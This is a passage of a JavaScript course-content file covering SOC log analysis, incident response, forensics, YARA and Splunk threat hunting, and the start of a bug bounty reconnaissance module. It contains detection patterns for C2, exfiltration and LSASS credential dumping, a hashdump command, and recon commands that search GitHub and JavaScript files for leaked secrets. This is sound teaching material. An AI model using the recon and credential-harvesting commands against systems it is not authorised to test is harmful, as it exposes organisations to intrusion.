        "- No more than 6 panels per dashboard (cognitive load)",
    },
  ],
};

const mod22 = {
  title: 'Module 2: Log Analysis & Threat Detection',
  lessons: [
    {
      key: 'mod22_2_0',
      title: 'Windows Event Log Analysis',
      content:
        "Windows Security log is your primary source for endpoint activity on Windows servers and workstations. Knowing what normal looks like lets you spot abnormal fast.\n\n" +
        "Most important Windows Event IDs to know:\n\n" +
        "4624 — Successful logon\n" +
        "4625 — Failed logon (brute force indicator)\n" +
        "4634 — Logoff\n" +
        "4672 — Special privileges assigned (Admin login)\n" +
        "4720 — User account created\n" +
        "4722 — User account enabled\n" +
        "4723 — Password change attempted\n" +
        "4724 — Password reset attempted\n" +
        "4725 — User account disabled\n" +
        "4726 — User account deleted\n" +
        "4732 — Member added to security group\n" +
        "4733 — Member removed from security group\n" +
        "4756 — Universal group member added\n" +
        "4757 — Universal group member removed\n" +
        "4740 — Account lockout\n\n" +
        "Logon types (field: LogonType):\n" +
        "2  = Interactive (keyboard)\n" +
        "3  = Network (SMB, file share access)\n" +
        "4  = Batch (scheduled task)\n" +
        "7  = Unlock (screen unlock)\n" +
        "8  = NetworkCleartext (plaintext creds sent)\n" +
        "10 = RemoteInteractive (RDP)\n" +
        "11 = CachedInteractive (laptop, no DC available)\n\n" +
        "Detection pattern — Brute force:\n" +
        "EventCode=4625\n" +
        "| stats count by src, user\n" +
        "| where count > 10 in 1 hour\n\n" +
        "Detection pattern — RDP brute force:\n" +
        "EventCode=4624 LogonType=10\n" +
        "| stats count by src, user\n" +
        "| where count > 5\n\n" +
        "Detection pattern — Privilege escalation:\n" +
        "EventCode=4672\n" +
        "| where user!=\"SYSTEM\" and user!=\"ANONYMOUS LOGON\"\n" +
        "| stats count by user, src\n\n" +
        "Sysmon (install on every Windows machine you manage):\n" +
        "Sysmon logs ProcessCreate (EventID 1), NetworkConnection (EventID 3), FileCreate (EventID 11)\n" +
        "Much richer than default Windows logging. Essential for DFIR.",
    },
    {
      key: 'mod22_2_1',
      title: 'Linux Syslog & Auth Log Analysis',
      content:
        "Linux systems generate detailed audit logs via syslog and the auth log (auth.log/secure on RHEL variants). Critical for detecting compromise on Linux servers.\n\n" +
        "Key log locations:\n" +
        "/var/log/auth.log       # Debian/Ubuntu: authentication events\n" +
        "/var/log/secure        # RHEL/CentOS: authentication events\n" +
        "/var/log/syslog         # General system events\n" +
        "/var/log/messages       # All kernel/system messages\n" +
        "/var/log/audit/audit.log  # Detailed audit events (if auditd installed)\n\n" +
        "Key patterns to detect:\n\n" +
        "SSH brute force:\n" +
        "grep \"Failed password\" /var/log/auth.log\n" +
        "grep \"Did not receive identification string\" /var/log/auth.log  # Connection without login\n\n" +
        "Successful SSH login:\n" +
        "grep \"Accepted password\" /var/log/auth.log\n" +
        "grep \"Accepted publickey\" /var/log/auth.log\n" +
        "# Format: May 24 12:00:00 server sshd[1234]: Accepted publickey for admin from 192.168.1.50 port 54321\n\n" +
        "Sudo usage:\n" +
        "grep \"sudo\" /var/log/auth.log\n" +
        "# Shows who used sudo and what command they ran\n" +
        "# Critical: know what your admins' normal sudo patterns look like\n\n" +
        "Failed sudo attempts:\n" +
        "grep \"sudo:.*authentication failure\" /var/log/auth.log\n\n" +
        "User creation/deletion:\n" +
        "grep -E \"(useradd|userdel|groupadd)\" /var/log/auth.log\n" +
        "journalctl -u useradd  # if systemd\n\n" +
        "Cron job execution:\n" +
        "grep \"CRON\" /var/log/auth.log\n" +
        "# Shows scheduled tasks — useful for finding persistence mechanisms\n\n" +
        "Reading journald logs (modern Linux):\n" +
        "journalctl -u sshd --since \"1 hour ago\"\n" +
        "journalctl _UID=0 --since today\n" +
        "journalctl -g \"failed password\" --since today\n\n" +
        "Auditd rules (auditd.conf + rules file):\n" +
        "-w /etc/passwd -p wa -k identity_modify  # Watch for user changes\n" +
        "-w /etc/shadow -p wa -k shadow_modify   # Watch for shadow changes\n" +
        "-a always,exit -F arch=b64 -S execve -k cmd_exec  # Log all command execution",
    },
    {
      key: 'mod22_2_2',
      title: 'Firewall & Network Log Analysis',
      content:
        "Firewall logs are gold for understanding network activity and detecting C2, exfiltration, and lateral movement.\n\n" +
        "Reading firewall logs (iptables/netfilter):\n" +
        "# /var/log/kern.log or /var/log/messages\n" +
        "IN=eth0 OUT= MAC=xx:xx SRC=192.168.1.50 DST=10.10.10.5 PROTO=TCP DPT=445 SPT=54321\n" +
        "# IN/OUT = interface, SRC/DST = IPs, PROTO = protocol, DPT = dest port, SPT = source port\n\n" +
        "Common firewall log patterns to detect:\n\n" +
        "Suspicious outbound (possible C2):\n" +
        "# Windows uses random high ports for outbound. Watching for unexpected outbound connections:\n" +
        "ALERT if: internal host connects to external IP on port 4444 (Metasploit default)\n" +
        "ALERT if: internal host connects to external IP on port 8080 and user-agent = \"Mozilla/4.0\"\n\n" +
        "Port scan detection:\n" +
        "# Many connections to different ports from same source in short time:\n" +
        "src=192.168.1.50 hits more than 50 unique dst_ports in 5 minutes\n\n" +
        "Data exfiltration:\n" +
        "# Large uploads from internal server to external:\n" +
        "src=10.10.10.100 dest_port=21 bytes_out > 1000000000\n\n" +
        "DNS exfiltration (data encoded in DNS queries):\n" +
        "# Normal DNS: query for legitimate domain\n" +
        "# Exfiltration: many queries to same domain with long random subdomains\n" +
        "# Detection: look for subdomain length > 50 chars, high frequency\n\n" +
        "Understanding NetFlow vs Firewall logs:\n" +
        "NetFlow: 5-tuple (srcIP, dstIP, srcPort, dstPort, protocol) + bytes/packets\n" +
        "- Very fast to collect, gives you traffic volume and patterns\n" +
        "- Does not give you actual data/content\n" +
        "Firewall logs: everything in NetFlow + timestamps, action (allow/deny), user info\n" +
        "- More complete, but higher volume\n\n" +
        "Splunk query for firewall anomalies:\n" +
        "index=firewall\n" +
        "| stats sum(bytes_outbound) as total_sent, avg(duration) as avg_duration by src\n" +
        "| where total_sent > 5000000000\n" +
        "| join type=inner src [search index=main sourcetype=authentication user!=\"SYSTEM\" | stats dc(user) as user_count by src]",
    },
    {
      key: 'mod22_2_3',
      title: 'Correlation Rules & Detection Engineering',
      content:
        "Detection engineering is the discipline of writing rules that find attacker activity before damage is done. This is where great SOC analysts become invaluable.\n\n" +
        "Detection logic structure:\n" +
        "WHEN [observable] IS [condition] FROM [source] THEN [alert]\n\n" +
        "MITRE ATT&CK framework — map your detections to ATT&CK techniques:\n" +
        "- T1078: Valid Accounts (logon with legitimate creds)\n" +
        "- T1059: Command and Scripting Interpreter (PowerShell, cmd, Python)\n" +
        "- T1053: Scheduled Task/Job (persistence via cron/schtasks)\n" +
        "- T1046: Network Service Scanning (port scanning)\n" +
        "- T1021: Remote Services (RDP, SMB, VNC)\n\n" +
        "Writing correlation rules in Splunk:\n\n" +
        "# Rule: Same user fails to log in from 5 different IPs in 10 minutes\n" +
        "index=main EventCode=4625\n" +
        "| stats dc(src) as unique_sources, values(src) as source_ips by user\n" +
        "| where unique_sources >= 5\n" +
        "| eval severity=case(unique_sources>=10, \"HIGH\", unique_sources>=5, \"MEDIUM\")\n\n" +
        "# Rule: Admin logs in from new country not seen in last 90 days\n" +
        "index=main EventCode=4672\n" +
        "| lookup geoip clientip AS src OUTPUT country\n" +
        "| stats recent_country=last(country), all_countries=values(country) by user\n" +
        "| where recent_country NOT IN (all_countries[0:90])\n\n" +
        "Threshold-based vs behavioral detection:\n" +
        "- Threshold: Alert after X events (e.g., 5 failed logins). Simple but easy to bypass.\n" +
        "- Behavioral: Learn what normal looks like, alert on deviations. Harder to evade.\n\n" +
        "Writing detection documentation:\n" +
        "Detection Name: RDP Brute Force\n" +
        "MITRE ID: T1110 (Brute Force)\n" +
        "Logic: More than 5 failed logins (EventCode 4625, LogonType 10) from same source IP in 10 minutes\n" +
        "Severity: HIGH\n" +
        "False Positives: VPN users with multiple attempts, misconfigured remote desktop gateways\n" +
        "Response: Investigate source IP in firewall logs, check if account is locked, review successful logins from same IP",
    },
  ],
};

const mod23 = {
  title: 'Module 3: Incident Response & Digital Forensics',
  lessons: [
    {
      key: 'mod23_3_0',
      title: 'NIST Incident Response Framework',
      content:
        "NIST SP 800-61 defines the incident response lifecycle. Every SOC analyst should know this framework cold.\n\n" +
        "Four phases of incident response:\n\n" +
        "1. PREPARATION — Getting ready before incidents happen\n" +
        "- Create IRP (Incident Response Plan)\n" +
        "- Define roles and responsibilities\n" +
        "- Establish communication channels (encrypted)\n" +
        "- Build toolkit (forensics workstation, write blockers, hash tools)\n" +
        "- Train the team (tabletop exercises, red vs blue)\n" +
        "- Document everything before you need it\n\n" +
        "2. DETECTION & ANALYSIS — Finding and understanding incidents\n" +
        "- Collect initial evidence (logs, memory, disk images)\n" +
        "- Determine scope (how many hosts affected?)\n" +
        "- Classify severity (Critical/High/Medium/Low)\n" +
        "- Assign incident commander\n" +
        "- Begin incident log (chronological events, decisions made, evidence collected)\n\n" +
        "3. CONTAINMENT, ERADICATION & RECOVERY — Stopping the bleeding, cleaning up\n" +
        "SHORT-TERM CONTAINMENT: Stop the bleeding fast\n" +
        "- Isolate affected systems (air-gapped network, block at firewall)\n" +
        "- Preserve evidence (do not wipe/reboot without imaging first)\n" +
        "- Identify attacker footprint (what else did they access?)\n\n" +
        "LONG-TERM CONTAINMENT: Restore normal operations securely\n" +
        "- Patch exploited vulnerabilities\n" +
        "- Reset compromised credentials\n" +
        "- Monitor for reinfection\n\n" +
        "ERADICATION: Remove attacker presence\n" +
        "- Remove malware, backdoors, persistence mechanisms\n" +
        "- Close attack vectors\n" +
        "- Verify no re-entry points remain\n\n" +
        "RECOVERY: Bring systems back online\n" +
        "- Restore from clean backups only (verify backup is not also compromised)\n" +
        "- Monitor for IOCs (Indicators of Compromise)\n" +
        "- Validate integrity before declaring clean\n\n" +
        "4. POST-INCIDENT ACTIVITY — Learning for next time\n" +
        "- Write incident report (timeline, evidence, what worked, what failed)\n" +
        "- Conduct lessons learned review (within 2 weeks)\n" +
        "- Update detection rules (what missed this time?)\n" +
        "- Update IR plan based on gaps discovered",
    },
    {
      key: 'mod23_3_1',
      title: 'Evidence Collection & Chain of Custody',
      content:
        "If evidence is not collected properly, it is useless in court or a disciplinary hearing. Chain of custody is non-negotiable.\n\n" +
        "Order of volatility (collect most volatile first):\n" +
        "1. CPU registers, cache        (most volatile)\n" +
        "2. Memory (RAM)\n" +
        "3. Network connections\n" +
        "4. Running processes\n" +
        "5. Disk (least volatile, but most important to preserve)\n\n" +
        "Live memory acquisition:\n" +
        "sudo LiME -format=lime -filename=/mnt/mem.lime\n" +
        "# Linux Memory Extractor - kernel module that dumps RAM\n" +
        "sudo dd if=/dev/mem of=/mnt/mem.raw bs=1M status=progress\n" +
        "# Raw memory dump - slower\n\n" +
        "Windows memory (WinPmem):\n" +
        "winpmem_minido_x64.exe output.raw\n\n" +
        "Disk imaging:\n" +
        "sudo dd if=/dev/sda of=/mnt/disk_image.dd bs=4M status=progress conv=noerror,sync\n" +
        "# Raw dd image - bit-for-bit copy\n\n" +
        "# Using FTK Imager (free, Windows):\n" +
        "# Physical Drive > Select drive > Image Destination > Raw (dd)\n\n" +
        "Hash everything immediately:\n" +
        "md5sum disk_image.dd\n" +
        "sha256sum disk_image.dd\n" +
        "# Document hash in evidence log — if hash changes, evidence is compromised\n\n" +
        "Chain of custody form (document everything):\n" +
        "Evidence ID: EV-2026-0524-001\n" +
        "Description: Samsung 500GB SSD from Dell Laptop (asset tag: NL-441)\n" +
        "Collected by: [Name] on 2026-05-24 at 14:30 WAT\n" +
        "Location: Room 3, Building A, Lagos Office\n" +
        "Hash (SHA256): a3f8... (computed at collection time)\n" +
        "Hash (SHA256): b7d2... (computed at lab, verified match)\n" +
        "Storage location: Sealed evidence bag #44, locked in server room cabinet B\n" +
        "Accessed by: [Name] on [date] — reason: [reason]\n\n" +
        "Never work on original evidence — always work on a copy.",
    },
    {
      key: 'mod23_3_2',
      title: 'Malware Analysis Fundamentals',
      content:
        "Every SOC analyst should be able to do basic malware analysis — determine what a suspicious file does without letting it execute in a production environment.\n\n" +
        "Static analysis (examine without running):\n\n" +
        "File identification:\n" +
        "file suspicious.exe          # PE executable, 64-bit\n" +
        "strings suspicious.exe | head -50  # Look for embedded strings\n" +
        "md5sum suspicious.exe         # Get hash for VirusTotal lookup\n\n" +
        "YARA scanning:\n" +
        "yara -r rules.yar suspicious.exe\n" +
        "# Check against known malware signatures\n\n" +
        "PE header analysis (Windows executables):\n" +
        "objdump -x suspicious.exe | head -50\n" +
        "# Shows imports, exports, sections, compilation timestamp\n" +
        "# Compilation timestamp in far future = suspicious (packed/encrypted malware)\n\n" +
        "Strings analysis:\n" +
        "strings suspicious.exe | grep -i \"http\\|\\\\\\\\\\\\\\\\\"| grep -E \"(cmd|powershell|wget|curl|eval)\"\n" +
        "# Look for: URLs, file paths, suspicious commands, IPs, mutex names, registry keys\n\n" +
        "Dynamic analysis (run in sandbox):\n" +
        "Use any.run, Hybrid Analysis, or Joe Sandbox for safe detonation\n" +
        "Upload suspicious.exe → get full behavioral report\n\n" +
        "Key things to look for in malware behavior:\n" +
        "- Network connections to suspicious IPs\n" +
        "- File creation in AppData/Local/Temp\n" +
        "- Registry modifications (persistence keys)\n" +
        "- Process injection (spawns other processes)\n" +
        "- Mutex creation (single instance lock)\n" +
        "- Crypto operations (ransomware fingerprint)\n\n" +
        "Obfuscation detection:\n" +
        "- Packed binaries: UPX, ASPack (high entropy, unusual section names)\n" +
        "- Look for: .upx section, imports minimal but executable big\n" +
        "- PyInstaller: huge executable, contains python DLLs inside",
    },
    {
      key: 'mod23_3_3',
      title: 'Forensic Timeline Construction',
      content:
        "Building a forensic timeline is how you reconstruct what the attacker did, in order. This is the core skill of incident response.\n\n" +
        "Plaso (log2timeline) — the gold standard:\n" +
        "log2timeline.py --zonal-files /mnt/zoneinfo profile.db image.raw\n" +
        "# Ingests: syslog, browser history, Windows Event Logs, recicle bin, shortcuts, registry, and 100+ more sources\n" +
        "# Outputs: single SQLite database with all events timestamped\n\n" +
        "Reading a Plaso timeline:\n" +
        "pinfo.py profile.db | grep \"2026-05-24\"\n" +
        "# Shows all events from that day in chronological order\n\n" +
        "Timesketch (Splunk + Plaso front-end):\n" +
        "# Upload Plaso DB to Timesketch for visual timeline browsing\n" +
        "# Tag events as suspicious/normal\n" +
        "# Export findings directly to incident report\n\n" +
        "Manual Windows timeline construction:\n" +
        "1. Prefetch files: when programs were first/last run, how many times\n" +
        "2. Jump lists: recently opened files, frequently used apps\n" +
        "3. RecentFileCache.bcf: recently used files (deleted but recoverable)\n" +
        "4. Amcache.hve: application execution history (unfiltered)\n" +
        "5. Windows Event Logs: logon/logoff, process creation, service changes\n\n" +
        "Mac OS forensics:\n" +
        "- Unified Logging (macOS 10.12+): /var/log/system.log\n" +
        "- Audit logs: /var/audit/*\n" +
        "- LSQuartz database: browser history (Safari)\n" +
        "- Spotlight: recently searched files\n\n" +
        "Constructing the attacker timeline:\n" +
        "T1: 2026-05-24 08:14:22 — First connection from external IP (firewall log)\n" +
        "T2: 2026-05-24 08:14:31 — HTTP GET for malicious .exe (proxy log)\n" +
        "T3: 2026-05-24 08:14:35 — PowerShell execution (Sysmon EventID 1)\n" +
        "T4: 2026-05-24 08:15:01 — New scheduled task created (Windows EventID 4698)\n" +
        "T5: 2026-05-24 08:16:00 — SMB connection to DC (Sysmon EventID 3)\n" +
        "T6: 2026-05-24 08:17:12 — User enumeration of Domain Admins (Windows EventID 4662)",
    },
  ],
};

const mod24 = {
  title: 'Module 4: Threat Hunting & Proactive Defense',
  lessons: [
    {
      key: 'mod24_4_0',
      title: 'Threat Hunting Methodologies',
      content:
        "Threat hunting is proactively looking for attacker activity that your existing tools missed. It is hypothesis-driven, not alert-driven.\n\n" +
        "Hunting frameworks:\n\n" +
        "MITRE ATT&CK Navigator:\n" +
        "Use the ATT&CK matrix to identify which techniques are most likely in your environment based on your threat intelligence.\n\n" +
        "David Bianco's Pyramid of Pain:\n" +
        "Hash values (file)        → Easy to change, nearly useless to hunt by\n" +
        "IP addresses              → Easy to change, attacker can use new IPs\n" +
        "Domain names              → Can be registered fast, harder to hunt\n" +
        "Network artifacts (C2)   → Harder for attacker to change, good to hunt\n" +
        "Tools                     → Attacker must develop new tooling\n" +
        "TTPs (behaviors)          → Hardest to change, best hunting target\n\n" +
        "Hunting hypothesis examples:\n" +
        "H1: Attacker is using rundll32.exe to execute malicious code via COM surrogates\n" +
        "   → Hunt: Look for rundll32.exe with unusual command line arguments\n" +
        "   → Data: Sysmon EventID 1 (process create)\n\n" +
        "H2: Attacker has persistence via registry Run key\n" +
        "   → Hunt: Look for new registry values in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n" +
        "   → Data: Windows EventID 4657 (registry value created)\n\n" +
        "H3: Attacker is using DNS tunneling for C2\n" +
        "   → Hunt: Look for long random subdomains queried repeatedly\n" +
        "   → Data: DNS query logs\n\n" +
        "H4: Attacker moved laterally using WMI\n" +
        "   → Hunt: Look for wmic.exe or New-Object System.Management connection\n" +
        "   → Data: Sysmon EventID 1, Sysmon EventID 7 (image loaded)\n\n" +
        "Hunting workflow:\n" +
        "1. Form hypothesis (based on threat intel, recent CVEs, industry trends)\n" +
        "2. Identify data sources needed\n" +
        "3. Write query to test hypothesis\n" +
        "4. Analyze results — look for anomalies\n" +
        "5. If suspicious, escalate to IR\n" +
        "6. Document findings and update detection rules",
    },
    {
      key: 'mod24_4_1',
      title: 'Memory Forensics with Volatility',
      content:
        "Memory forensics lets you see what was happening on a machine at the time of capture — including processes that no longer exist on disk.\n\n" +
        "Acquiring memory (do this before rebooting or shutting down):\n" +
        "sudo dd if=/dev/mem of=/mnt/mem.raw bs=1M status=progress\n" +
        "sudo LiMEformat=lime -filename=/mnt/mem.lime\n\n" +
        "Volatility 3 basics:\n" +
        "vol -f mem.lime windows.pslist  # List running processes\n" +
        "vol -f mem.lime windows.netscan  # Network connections (all, even closed)\n" +
        "vol -f mem.lime windows.malfind # Find injected code\n" +
        "vol -f mem.lime windows.cmdline # Command line of each process\n\n" +
        "Key Volatility commands for hunting:\n\n" +
        "Process analysis:\n" +
        "vol -f mem.lime windows.pslist | grep -v \"System\\|svchost\\|explorer\"\n" +
        "# Look for suspicious processes: unusual names, high CPU, hidden\n\n" +
        "Hidden process detection:\n" +
        "vol -f mem.lime windows.malfind --pretty\n" +
        "# Malfind looks for memory pages with RWX (read-write-execute) permissions\n" +
        "# Injected code typically has RWX — legitimate code rarely does\n\n" +
        "Network artifacts:\n" +
        "vol -f mem.lime windows.netscan | grep ESTABLISHED\n" +
        "# Find active network connections from memory\n" +
        "# Even if attacker closed connections, process table might still show them\n\n" +
        "Registry analysis (persistence):\n" +
        "vol -f mem.lime windows.registry.printkey --key 'Microsoft\\Windows\\CurrentVersion\\Run'\n" +
        "# Check what runs at startup — compare against known-good baseline\n\n" +
        "Finding C2 in memory:\n" +
        "vol -f mem.lime windows.netscan | grep -E \"(4444|8080|1337|31337)\"\n" +
        "# Look for known malware ports in established connections\n\n" +
        "Extracting passwords from memory:\n" +
        "vol -f mem.lime windows.hashdump\n" +
        "# Dumps cached domain hashes from memory (need SYSTEM privilege)",
    },
    {
      key: 'mod24_4_2',
      title: 'YARA Rules for Threat Detection',
      content:
        "YARA is the industry-standard tool for writing malware signatures. Well-written rules catch malware without generating false positives.\n\n" +
        "YARA rule structure:\n\n" +
        "rule Suspicious_PowerShell {\n" +
        "    meta:\n" +
        "        description = \"Detects obfuscated PowerShell execution\"\n" +
        "        author = \"SOC Team\"\n" +
        "        date = \"2026-05-24\"\n" +
        "    strings:\n" +
        "        $s1 = \"-Enc\" ascii\n" +
        "        $s2 = \"-EncodedCommand\" ascii\n" +
        "        $s3 = \"IEX\" ascii\n" +
        "        $s4 = \"\\\\\\\\x\" fullword\n" +
        "    condition:\n" +
        "        2 of them\n" +
        "}\n\n" +
        "Scanning with YARA:\n" +
        "yara -r rules.yar /directory/to/scan\n" +
        "# -r: recursive, scan all files in directories\n\n" +
        "More advanced YARA:\n\n" +
        "rule Metasploit_Reverse_Shell {\n" +
        "    strings:\n" +
        "        $a = \"WVBFI\" fullword  // Metasploit marker\n" +
        "        $b = \"msf\" nocase\n" +
        "        $c = /socket\\\\.new|eval|system/ fullword\n" +
        "    condition:\n" +
        "        uint16(0) == 0x5A4D  // MZ header (PE file)\n" +
        "        and 2 of ($a, $b, $c)\n" +
        "}\n\n" +
        "Hex string patterns:\n" +
        "Wildcards:  ?? = any byte, * = any number of bytes\n" +
        "Example:  4D 5A ?? ?? ?? ??  // MZ header with wildcards\n" +
        "          4D 5A * 42 61  // MZ header, skip middle, then 'Ba'\n\n" +
        "Modules (group related rules):\n" +
        "import \"pe\"\n" +
        "rule PE_Compromised_Section {\n" +
        "    condition:\n" +
        "        // Check for suspicious section names\n" +
        "        for any section in pe.sections:\n" +
        "            section.name == \".upx\" or section.name == \".text\"\n" +
        "}\n\n" +
        "Automating YARA with ClamAV:\n" +
        "ClamAV supports YARA signatures in /var/lib/clamav/\n" +
        "freshclam  # Update signatures before scanning\n" +
        "clamscan -r /home  # Scan with YARA rules active",
    },
    {
      key: 'mod24_4_3',
      title: 'Splunk Threat Hunting Playbook',
      content:
        "A practical playbook for hunting common attacker techniques using Splunk SPL.\n\n" +
        "HUNT 1: PowerShell-based C2\n" +
        "Data: Sysmon EventID 1 (process creation)\n" +
        "Hypothesis: Attacker is using PowerShell to download and execute payload\n" +
        "\n" +
        "Search:\n" +
        "index=main EventCode=1 ImageLoaded=\"*\\\\\\\\powershell.exe\"\n" +
        "| regex CommandLine=\"(IEX|Invoke-Expression|\\\\\\\\.\\\\\\\\)|\\\\\\\\n|\\\\\\\\x22|\\\\\\\\-enc\"\n" +
        "| stats count, values(CommandLine) by src, user\n" +
        "| where count > 3\n\n" +
        "What to look for: PowerShell executing encoded commands (base64), long strings, IEX downloading from URL\n\n" +
        "HUNT 2: SMB Lateral Movement\n" +
        "Data: Windows Security EventID 4624 (logon), Sysmon EventID 3 (network)\n" +
        "Hypothesis: Attacker is moving laterally using SMB\n" +
        "\n" +
        "Search:\n" +
        "index=main EventCode=4624 LogonType=3 dest_workstation_name=*\n" +
        "| stats dc(LogonType) as logon_types, values(src) as source_ips by user, dest\n" +
        "| where logon_types > 1\n\n" +
        "What to look for: Same user logging into multiple different hosts via network logon (LogonType=3)\n\n" +
        "HUNT 3: DNS Tunneling Detection\n" +
        "Data: DNS query logs\n" +
        "Hypothesis: Attacker is encoding data in DNS queries\n" +
        "\n" +
        "Search:\n" +
        "index=dns query_length > 80\n" +
        "| stats count by query_name, src\n" +
        "| where count > 100\n" +
        "| sort -count\n\n" +
        "What to look for: Subdomain lengths > 80 characters, high frequency of queries to same domain\n\n" +
        "HUNT 4: Credential Dumping\n" +
        "Data: Sysmon EventID 10 (process access)\n" +
        "Hypothesis: Attacker is using mimikatz to dump LSASS\n" +
        "\n" +
        "Search:\n" +
        "index=main EventCode=10 TargetImage=\"*\\\\\\\\lsass.exe\" CallStack=*\n" +
        "| regex CallStack=\"(Ssp|Security|msv!)\"\n" +
        "| stats count by src, TargetImage\n\n" +
        "What to look for: Any process accessing lsass.exe with suspicious call stacks (mimikatz pattern)\n\n" +
        "HUNT 5: Data Exfiltration via DNS\n" +
        "Data: DNS query logs + Firewall NetFlow\n" +
        "Hypothesis: Large DNS queries indicate data being exfiltrated\n" +
        "\n" +
        "Search:\n" +
        "index=dns | stats avg(query_length) as avg_len, max(query_length) as max_len, count by src\n" +
        "| where max_len > 200\n" +
        "| join type=inner src [search index=firewall | stats sum(bytes_out) as total_sent by src]\n" +
        "| sort -total_sent",
    },
  ],
};

const mod25 = {
  title: 'Module 1: Bug Bounty Reconnaissance',
  lessons: [
    {
      key: 'mod25_1_0',
      title: 'Subdomain Enumeration Strategies',
      content:
        "Recon is the most important phase of bug bounty. You cannot test what you cannot find. The bigger your scope coverage, the more bugs you find.\n\n" +
        "Subdomain enumeration frameworks:\n\n" +
        "Amass (OWASP):\n" +
        "amass enum -passive -d target.com -o subs_passive.txt\n" +
        "amass enum -active -d target.com -o subs_active.txt\n" +
        "# Passive: uses public sources (DNSdumpster, crt.sh, Wayback Machine)\n" +
        "# Active: brute forces and resolves subdomains (louder)\n\n" +
        "Subfinder:\n" +
        "subfinder -d target.com -o subs.txt\n" +
        "# Aggregates 30+ sources automatically\n" +
        "# Very fast, minimal API key requirements\n\n" +
        "Assetfinder:\n" +
        "assetfinder --subs-only target.com | tee subs.txt\n\n" +
        "Shuffledns (brute force + resolution):\n" +
        "shuffledns -d target.com -w /usr/share/wordlists/dns.txt -r resolvers.txt -o subs.txt\n" +
        "# Resolves subdomain wordlist against target using massdns\n\n" +
        "Certificate Transparency (always check this):\n" +
        "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sed 's/*\\\\.//g' | sort -u > subs_ct.txt\n" +
        "# Also: crt.sh/?q=target.com (without wildcard)\n" +
        "# Also: censys.io (search for target.com certificates)\n\n" +
        "GitHub subdomain scanning:\n" +
        "python3 github-search.py subdomains target.com\n" +
        "# Finds subdomains mentioned in public GitHub repos\n\n" +
        "Building your wordlist:\n" +
        "- SecLists: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n" +
        "- Custom: build wordlist from company's industry, product names, common patterns\n" +
        "- For Nigerian targets: include local brand names, product codes\n\n" +
        "Filtering live subdomains:\n" +
        "cat all_subs.txt | httprobe -c 50 | tee alive_subs.txt\n" +
        "# Sends HTTP/HTTPS probe to each subdomain, keeps only live ones",
    },
    {
      key: 'mod25_1_1',
      title: 'GitHub Recon & OSINT',
      content:
        "GitHub holds an enormous amount of sensitive information that developers accidentally commit. This is one of the highest-yield bug bounty techniques.\n\n" +
        "GitHub Search (github.com/search):\n" +
        "Search for: filename:.env target.com\n" +
        "Search for: filename:config target.com\n" +
        "Search for: path:.git target.com\n" +
        "# Advanced search operators\n" +
        "language:Python target.com   # Code in specific language\n" +
        "user:targetcorp             # Repos belonging to target\n" +
        "org:target                  # Organization repositories\n\n" +
        "GitHub CLI (gh):\n" +
        "gh search code \"target.com password=*\" --limit 50\n" +
        "gh search code \"target.com api_key\" --limit 50\n" +
        "gh search code \"target.com AWS_SECRET\" --limit 50\n\n" +
        "Gitleak (scans git history for secrets):\n" +
        "gitleaks detect --source . --report-format json --report-path findings.json\n" +
        "# Scans current directory and entire git history\n" +
        "# Finds: API keys, passwords, tokens, private keys\n\n" +
        "TruffleHog (similar to gitleaks):\n" +
        "trufflehog filesystem . --json | tee trufflehog_results.json\n\n" +
        "What to look for:\n" +
        "- .env files with AWS keys, database passwords, JWT secrets\n" +
        "- config files with admin passwords\n" +
        "- AWS credentials (AKIA..., ASIA...)\n" +
        "- Azure/GCP service account keys\n" +
        "- Private keys (.pem, .key, id_rsa)\n" +
        "- Hardcoded JWT secrets\n" +
        "- Internal API endpoints not publicly known\n\n" +
        "GitRob (targeted recon for a specific organization):\n" +
        "gitrob target --output results.json\n" +
        "# Monitors GitHub for files matching organization's name\n" +
        "# Can be run continuously to monitor new commits\n\n" +
        "Other OSINT for bug bounty:\n" +
        "- LinkedIn: find employee names for phishing targets\n" +
        "- Shodan: find exposed services, tech stacks, internal IPs\n" +
        "- BuiltWith: technology fingerprinting\n" +
        "- Wappalyzer: technology identification\n" +
        "- Subdomain enumeration via Wayback Machine (waybackurls)",
    },
    {
      key: 'mod25_1_2',
      title: 'JavaScript Analysis & API Discovery',
      content:
        "JavaScript files are goldmines for bug bounty hunters. They contain API endpoints, hardcoded secrets, and parameter names that point you to testing targets.\n\n" +
        "Extracting JS files from a website:\n" +
        " Gau (get all URLs):\n" +
        "echo \"target.com\" | gau | grep '\\\\.js$' | tee js_urls.txt\n\n" +
        "LinkFinder (find endpoints in JS):\n" +
        "python3 linkfinder.py -i https://target.com/app.js -o results.html\n\n" +
        "SecretFinder (find credentials/secrets in JS):\n" +
        "python3 SecretFinder.py -i https://target.com/app.js -o results.json\n\n" +
        "JScan (cloud-based JS scanner):\n" +
        "# jsscan.xyz or similar tools\n\n" +
        "Manual approach:\n" +
        "curl -s https://target.com/app.js | grep -oE '\"[^\"]+\"' | sort -u | grep -E '(api|endpoint|config|auth|token|key)'\n\n" +
        "What to find in JavaScript:\n\n" +
        "API endpoints:\n" +
        "/api/v1/users\n" +
        "/api/v2/payments\n" +
        "/graphql\n" +
        "/rest/admin\n" +
        "# Find these → test them for IDOR, auth bypass, injection\n\n" +
        "Hardcoded credentials:\n" +
        "apiKey: 'pk_live_12345678'\n" +
        "token: 'Bearer eyJhbGciOi...'\n" +
        "# These are often valid test credentials or reveal auth patterns\n\n" +
        "Parameter names:\n" +
        "user_id, order_id, product_id, admin_id, role\n" +
        "# Look for these → test for IDOR\n\n" +
        "Interesting variables:\n" +
        "DEBUG: true  # May enable additional features\n" +
        "ENV: 'development'  # May expose features\n" +
        "BASE_URL: 'http://internal.target.com:8080'\n\n" +
        "Analysis workflow:\n" +
        "1. Extract all JS files: gau target.com | grep js$\n" +
        "2. Run SecretFinder on each: for u in $(cat js_urls.txt); do python3 SecretFinder.py -i $u; done\n" +
        "3. Run LinkFinder: linkfinder on main app.js\n" +
        "4. Look for hidden paths: /admin, /debug, /api/internal\n" +
        "5. Look for version-specific endpoints: /api/v1, /api/v2 (find deprecated ones)",
    },
    {
      key: 'mod25_1_3',
      title: 'Port Scanning & Service Discovery',
      content:
        "Bug bounty targets are not just websites. They run on infrastructure that often has exposed services that are forgotten.\n\n" +
        "Quick port scan for web targets:\n" +
        "nmap -p80,443,8080,8443,3000,5000 target.com -oA web_scan\n" +
        "# Quick check of common web ports\n\n" +
        "Full port scan for critical targets:\n" +
        "nmap -p- -sV target.com --open -oA full_scan\n\n" +
